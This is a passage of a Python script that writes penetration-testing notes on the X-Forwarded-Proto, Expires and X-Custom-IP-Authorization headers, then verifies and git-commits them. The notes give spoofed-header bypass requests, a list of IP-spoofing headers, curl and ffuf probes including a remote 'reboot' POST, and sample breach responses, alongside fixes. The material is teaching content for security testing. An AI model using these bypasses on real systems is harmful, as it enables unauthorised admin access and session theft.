WITHOUT THIS HEADER:
  Backend sees HTTP connection (to LB) → might think client is on HTTP
  → Generate http:// links → downgrade attack in email/responses!
```

---

## Attack: HTTP Downgrade via Spoofing

```
If app checks X-Forwarded-Proto to decide whether to redirect to HTTPS:

VULNERABLE CODE:
  if request.headers.get('X-Forwarded-Proto') != 'https':
      redirect_to_https()

BYPASS:
GET /secret HTTP/1.1
Host: target.com
X-Forwarded-Proto: https   ← claim we're already on HTTPS

→ App skips HTTPS redirect → serves response over HTTP!
→ If done via MITM, attacker can see the "HTTPS" page content!

ALSO USEFUL:
  App sets "Secure" flag on cookie ONLY if X-Forwarded-Proto: https
  Spoof it → app thinks you're HTTPS → sets Secure cookie → but sent over HTTP!
```

---

## Testing

```bash
# Check if app enforces HTTPS based on X-Forwarded-Proto
curl -k https://target.com/ -H "X-Forwarded-Proto: http"
# Does it redirect again? Or serve directly?

# Does changing to http bypass Secure cookie requirement?
curl -k https://target.com/login \
  -H "X-Forwarded-Proto: http" \
  -X POST -d "user=admin&pass=test" -v 2>&1 | grep -i set-cookie
```

---

## Use Cases

### 1. Bypassing HTTPS Redirection in Internal Networks
During Internal Penetration Testing or when operating under a Man-in-the-Middle (MITM) scenario, attackers might struggle to decrypt HTTPS traffic. If the target application forces HTTPS redirection, the attacker can insert `X-Forwarded-Proto: https` into their HTTP requests. The web application assumes the channel is already encrypted, suppresses the HTTPS redirection response, and transmits sensitive session details over unencrypted HTTP.

### 2. Capturing Sensitive Session Cookies over HTTP
If an application is configured to append the `Secure` flag to session cookies only when it detects an HTTPS connection via the `X-Forwarded-Proto` header, an attacker can exploit this logic. By spoofing the header to `http` (or forcing the proxy to send `http`), the application might issue session cookies without the `Secure` attribute, allowing them to be extracted from subsequent unencrypted connections.

### 3. Auditing CDN SSL-Termination Routing Policies
Penetration testers inspect reverse proxy configurations to ensure that client-supplied `X-Forwarded-Proto` headers are stripped or overwritten at the outer network edge. If the CDN forwards the client-provided header directly, the application's internal security checks can be completely subverted.

---

## Commands

These commands demonstrate how to perform security testing against load balancer proto-trusts:

```bash
# Verify if administrative endpoint accepts unencrypted HTTP traffic using header spoofing
curl -v -H "X-Forwarded-Proto: https" http://example.com/admin/login

# Checking if response sets cookies with the Secure flag missing when header is manipulated
curl -s -D - -o /dev/null -H "X-Forwarded-Proto: http" https://example.com/dashboard

# Generating HTTP requests in Python to analyze redirection rules
python3 -c 'import requests; r=requests.get("http://example.com/", headers={"X-Forwarded-Proto": "https"}); print(r.history, r.url)'
```

---

## Sample Output

### Vulnerable Server Response Lacking Cookie Flags
In the example below, the client accesses the server over plain HTTP but injects the `X-Forwarded-Proto: https` header. The server assumes a secure connection, bypasses redirection, and returns sensitive cookies without the `Secure` flag:

```text
HTTP/1.1 200 OK
Date: Mon, 15 Jun 2026 18:23:15 GMT
Server: Nginx
Content-Type: text/html; charset=UTF-8
Set-Cookie: session_token=z8x9c7v6b5n4m3; Path=/; HttpOnly
Content-Length: 512

<html>
<head><title>Secure Dashboard</title></head>
<body>
<h1>Authenticated User Dashboard</h1>
<!-- Sensitive Content Here -->
</body>
</html>
```
*(Notice that the application returned the HTML response and the `session_token` cookie over plain HTTP without the `Secure` attribute, allowing easy extraction via network eavesdropping).*

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| HTTPS enforcement based on XFP | Trust XFP only from known proxies; use HSTS |
| Cookie Secure flag dependent on XFP | Always set Secure flag regardless |
| XFP spoofed to claim HTTPS | Strip XFP from client requests at load balancer |

---

## Related Notes
- [[01 - Host Header]] — Host header attacks
- [[02 - X-Forwarded-For]] — companion forwarding header
"""
    },
    {
        "rel_path": "Web Application Security/B - 03 - HTTP Headers/50 - Expires.md",
        "content": """---
tags: [vapt, http-headers, web, beginner]
difficulty: beginner
module: "03 - HTTP Headers"
topic: "03.50 Expires — Caching Behavior"
---

# 03.50 — Expires

## What is it?

`Expires` is an HTTP/1.0 response header that sets an absolute date and time after which the cached resource is considered stale. It represents the original standard for managing browser caching before the more robust `Cache-Control: max-age` directive was introduced in HTTP/1.1. If both headers are supplied, the `Cache-Control` header takes precedence on modern browsers and proxies.

---

## Format

```
Expires: Thu, 01 Jan 2030 00:00:00 GMT    → cache until this date
Expires: 0                                 → already expired (don't cache)
Expires: Thu, 01 Jan 1970 00:00:00 GMT    → past date = expired = don't cache
```

---

## VAPT Relevance

```
SCENARIO 1: Far-future Expires on sensitive content
  Expires: Thu, 01 Jan 2030 00:00:00 GMT
  
  Sensitive data will be served from cache for years!
  → If shared CDN → all users get cached sensitive response!

SCENARIO 2: Conflicting headers
  Cache-Control: no-cache
  Expires: Thu, 01 Jan 2030 00:00:00 GMT
  
  Cache-Control wins in HTTP/1.1 → response won't be cached.
  But old HTTP/1.0 proxies only see Expires → cache for years!

SCENARIO 3: Session token in cached response
  Expires: [far future]
  Body: {"sessionToken": "abc123"}
  
  Other users on shared connection get cached token!
```

---

## Server Time Disclosure

```
Expires header reveals server's clock:
  Date: Thu, 01 Jun 2024 12:00:00 GMT    ← current server time
  Expires: Thu, 01 Jun 2024 12:00:30 GMT ← expires in 30 seconds
  
  → Exact server time known!
  → Can affect time-based security tokens that use server time!
  → Predictable "random" seeds if app uses time as seed!
```

---

## Testing

```bash
# Check Expires header:
curl -sI https://target.com | grep -iE "expires|date|cache-control"

# Check for far-future Expires on authenticated endpoints:
curl -sI https://target.com/account -H "Cookie: session=test" | grep expires
```

---

## Use Cases

### 1. Exploiting Session Cache Storage on Shared Devices
When a web application incorrectly configures the `Expires` header with a far-future date on authenticated profile endpoints without specifying `Cache-Control: no-store`, browsers will cache the HTML page containing personal information on local disk. An attacker sitting at a public library terminal can retrieve prior user profiles by pressing the browser back button or exploring the local profile cache directory.

### 2. Attacking Time-Synchronization Tokens (Server Time Disclosure)
If an application generates security tokens or TOTP codes using the server's system clock, attackers need precise knowledge of the server's time down to the second. Since the HTTP response header containing `Expires` and `Date` exposes the exact server clock (which may differ from GMT or local clients), an attacker can synchronize their local payload generation script to perfectly match the server's state.

### 3. Evading Content Delivery Network (CDN) Invalidation Rules
Under certain network conditions, legacy proxies or CDNs ignore HTTP/1.1 cache control and fallback to the `Expires` header. During security testing, auditors verify if the server returns headers that permit intermediate caching of dynamically generated user data. This is crucial for verifying compliance with HIPAA or PCI-DSS specifications.

---

## Commands

These commands demonstrate how to inspect and audit `Expires` caching rules:

```bash
# Analyzing caching headers on an administrative dashboard
curl -I -s https://example.com/dashboard/users

# Automated query checking if dynamic pages return a stale date in Expires
curl -s -I -H "Cookie: session=authenticated" https://example.com/profile | grep -iE "^(Expires|Cache-Control|Pragma)"

# Verification of server time offsets relative to local testing machine time
curl -s -i https://example.com/ | grep -iE "^(Date|Expires)"
```

---

## Sample Output

### Vulnerable Server Response caching sensitive user details
In the following server response, the presence of a far-future `Expires` header alongside a missing or weak `Cache-Control` header prompts the client's browser to store sensitive data locally:

```text
HTTP/1.1 200 OK
Date: Mon, 15 Jun 2026 18:23:20 GMT
Server: nginx/1.18.0
Content-Type: application/json
Expires: Wed, 15 Jun 2027 18:23:20 GMT
Connection: keep-alive
Content-Length: 120

{
  "user_id": 9012,
  "credit_card_mask": "4111-XXXX-XXXX-1111",
  "secret_auth_code": "SEC_KEY_8a92f02b"
}
```
*(Because the `Expires` header specifies a date one year in the future and there is no `Cache-Control` preventing local caching, the browser will cache the credit card and authorization code details on disk).*

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Far-future Expires on sensitive pages | Use `Cache-Control: no-store` instead |
| Expires without Cache-Control | Add modern Cache-Control directives |
| Server time disclosure | Acceptable trade-off; don't use time as security seed |

---

## Related Notes
- [[48 - Cache-Control]] — modern cache control
- [[49 - Pragma]] — other legacy header
"""
    },
    {
        "rel_path": "Web Application Security/B - 03 - HTTP Headers/08 - X-Custom-IP-Authorization.md",
        "content": """---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.08 X-Custom-IP-Authorization — WAF/Access Bypass"
---

# 03.08 — X-Custom-IP-Authorization

## What is it?

`X-Custom-IP-Authorization` is a non-standard, proprietary HTTP header sometimes introduced by custom web applications, legacy API gateways, or internal load balancers to perform IP-based authorization checks. If the backend microservice depends on this header to authenticate the origin of a request, an external attacker can inject the header to spoof a trusted internal network client.

It represents a class of custom IP headers that applications sometimes invent for internal use.

---

## Why This Exists

```
LEGITIMATE USE (internal microservices):
  Internal load balancer sets X-Custom-IP-Authorization: 10.10.1.5
  Backend service reads this to know which internal service called it
  
PROBLEM:
  External requests also flow through the same path!
  Attacker can set this header to any IP they want!
```

---

## Attack: IP Spoofing for Access Bypass

```
REQUEST (normal — blocked):
  GET /admin HTTP/1.1
  Host: target.com
  → 403 Forbidden

ATTACK:
  GET /admin HTTP/1.1
  Host: target.com
  X-Custom-IP-Authorization: 127.0.0.1   → admin access!

  OR if internal IP range is trusted:
  X-Custom-IP-Authorization: 10.0.0.1
  X-Custom-IP-Authorization: 192.168.1.1
```

---

## Full List of IP Bypass Headers to Try

```bash
# Try all of these simultaneously or one by one:
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Forwarded: for=127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
Fastly-Client-IP: 127.0.0.1
```

---

## Testing

```bash
# Try with localhost
curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target.com/admin

# Try with internal IP ranges
curl -H "X-Custom-IP-Authorization: 10.0.0.1" https://target.com/admin
```

---

## Use Cases

### 1. Accessing Protected Admin Portals Behind Proxy Servers
In complex enterprise networks, administrators might route incoming client traffic through multiple reverse proxies and WAFs. If an internal API Gateway restricts access to administrative endpoints strictly to internal IP ranges using a custom configuration that checks the `X-Custom-IP-Authorization` header, an attacker can append `X-Custom-IP-Authorization: 127.0.0.1` to route external requests straight into administrative consoles.

### 2. Evading Web Application Firewall (WAF) Rate Limiting
WAF deployments sometimes white-list certain IP addresses (e.g., search engine spiders or API integrations) and track their white-list status using internal headers like `X-Custom-IP-Authorization`. By identifying these custom headers during a source code review or via header probing, an attacker can bypass rate-limiting policies entirely by pretending to be a whitelisted indexing bot.

### 3. Exploiting Microservice Trust Relationships
In service-oriented architectures, frontend proxies process authentication, and backend microservices assume that any received traffic is pre-authorized. If microservices use `X-Custom-IP-Authorization` to ensure the call comes from the API Gateway, and the Gateway fails to sanitize this header from incoming client requests, an external client can make direct calls to internal endpoints.

---

## Commands

These commands show how to probe for custom IP-based authorization bypass vulnerabilities:

```bash
# Probing a target administrative route with X-Custom-IP-Authorization
curl -v -H "X-Custom-IP-Authorization: 127.0.0.1" https://example.com/api/admin/system-status

# Auditing an endpoint by brute forcing whitelisted IP segments through the header
ffuf -w internal_ips.txt -u https://example.com/admin/auth -H "X-Custom-IP-Authorization: FUZZ" -mc 200

# Testing a custom microservice routing endpoint
curl -X POST -H "Content-Type: application/json" -H "X-Custom-IP-Authorization: 10.10.15.20" -d '{"cmd": "reboot"}' https://example.com/api/v2/service/control
```

---

## Sample Output

### Unauthorized Administrative Access Log Output
This console output demonstrates a successful security bypass on an administrative page using the custom authorization header:

```text
HTTP/1.1 200 OK
Date: Mon, 15 Jun 2026 18:23:25 GMT
Server: Nginx
Content-Type: application/json; charset=UTF-8
Content-Length: 184

{
  "status": "authenticated",
  "access_level": "administrator",
  "trusted_source": "internal-segment",
  "authorized_ip": "127.0.0.1",
  "active_sessions": [
    {"user": "corp_admin", "ip": "10.0.2.14"}
  ]
}
```
*(Access to the API was granted because the application trusted the user-supplied header `X-Custom-IP-Authorization: 127.0.0.1` to identify the origin network node).*

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| App trusts X-Custom-IP-Authorization | Strip all custom IP headers at perimeter |
| IP-based access control via headers | Use real TCP connection IP ($remote_addr in Nginx) |

---

## Related Notes
- [[02 - X-Forwarded-For]] — most common IP bypass header
- [[05 - X-Real-IP]] — Nginx IP header
"""
    }
]

def run_verification(repo_root):
    # Run the verification script and parse stdout
    cmd = ["python3", "/home/sanchit/Notes/VAPT/verify_enhancement.py", repo_root]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result

def main():
    repo_root = "/home/sanchit/Notes/VAPT"
    print(f"Starting pilot batch processing at {repo_root}...")
    
    # We will import verify_file directly to perform granular validation
    sys.path.append(repo_root)
    try:
        from verify_enhancement import verify_file, parse_baseline
        baseline_path = "/home/sanchit/.gemini/antigravity-cli/brain/77399aa3-cb2f-4b0e-8289-c2d532a5d414/file_stats.md"
        baseline = parse_baseline(baseline_path)
    except Exception as e:
        print(f"Error importing verification modules: {e}")
        sys.exit(1)

    for item in FILES_TO_ENHANCE:
        rel_path = item["rel_path"]
        abs_path = os.path.join(repo_root, rel_path)
        content = item["content"]
        
        print(f"\n==========================================")
        print(f"Processing: {rel_path}")
        
        # Ensure directory exists
        os.makedirs(os.path.dirname(abs_path), exist_ok=True)
        
        # Write enhanced content in-place
        try:
            with open(abs_path, "w", encoding="utf-8") as f:
                f.write(content)
            print(f"Wrote content to {abs_path}")
        except Exception as e:
            print(f"Error writing file {abs_path}: {e}")
            continue
            
        # Run verify_file on the file
        baseline_size = baseline.get(rel_path)
        passed, reason = verify_file(abs_path, rel_path, baseline_size)
        
        # Also run verify_enhancement.py to verify
        run_res = run_verification(repo_root)
        
        # Check if this file is mentioned as FAIL in the verify_enhancement.py output
        subprocess_passed = True
        if f"FAIL: {rel_path}" in run_res.stdout:
            subprocess_passed = False
            print(f"Subprocess verification failed for {rel_path}")
            print(run_res.stdout)
            
        if passed and subprocess_passed:
            print(f"Verification PASSED: {reason}")
            
            # git add
            add_cmd = ["git", "add", abs_path]
            print(f"Executing: {' '.join(add_cmd)}")
            subprocess.run(add_cmd, check=True)
            
            # git commit with retry logic
            file_name = os.path.basename(rel_path)
            commit_cmd = ["git", "commit", "-m", f"Enhance {file_name}"]
            
            committed_successfully = False
            for attempt in range(1, 6):
                print(f"Attempting commit {attempt}/5: {' '.join(commit_cmd)}")
                commit_res = subprocess.run(commit_cmd, capture_output=True, text=True)
                
                if commit_res.returncode == 0:
                    print(f"Commit success on attempt {attempt}!")
                    print(commit_res.stdout.strip())
                    committed_successfully = True
                    break
                else:
                    print(f"Commit attempt {attempt} failed.")
                    print(f"stdout: {commit_res.stdout.strip()}")
                    print(f"stderr: {commit_res.stderr.strip()}")
                    if "lock" in commit_res.stderr or "index.lock" in commit_res.stderr:
                        print("Lock file detected. Waiting 1 second...")
                        time.sleep(1)
                    elif "nothing to commit" in commit_res.stdout or "nothing to commit" in commit_res.stderr:
                        print("Nothing to commit (already up to date).")
                        committed_successfully = True
                        break
                    else:
                        print("Unknown commit failure, retrying after 1 second...")
                        time.sleep(1)
                        
            if not committed_successfully:
                print(f"FAIL: Could not commit {rel_path} after 5 attempts.")
        else:
            print(f"FAIL: Verification failed: {reason}")

    print("\n==========================================")
    print("Pilot Batch enhancement script finished execution.")

if __name__ == "__main__":
    main()
